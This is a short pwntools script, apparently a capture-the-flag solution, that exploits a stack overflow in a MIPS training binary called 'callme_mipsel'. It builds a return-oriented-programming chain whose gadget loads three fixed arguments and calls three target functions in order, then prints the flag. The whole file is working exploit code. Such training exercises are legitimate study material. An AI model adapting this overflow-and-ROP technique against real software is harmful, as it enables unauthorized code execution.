#/usr/bin/python3
from pwn import process, p32, log

shell = process("./callme_mipsel")

offset = 36
junk = b"A" * offset

callme1 = p32(0x400d20)
callme2 = p32(0x400d80)
callme3 = p32(0x400d10)

loader  = b""
loader += p32(0x400bb0) # lw $a0, 0x10($sp); lw $a1, 0xc($sp); lw $a2, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
loader += p32(0x0)      # padding

arguments  = b""
arguments += p32(0xd00df00d)
arguments += p32(0xcafebabe)
arguments += p32(0xdeadbeef)

payload  = b""
payload += junk
payload += loader + callme1 + arguments
payload += loader + callme2 + arguments
payload += loader + callme3 + arguments

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
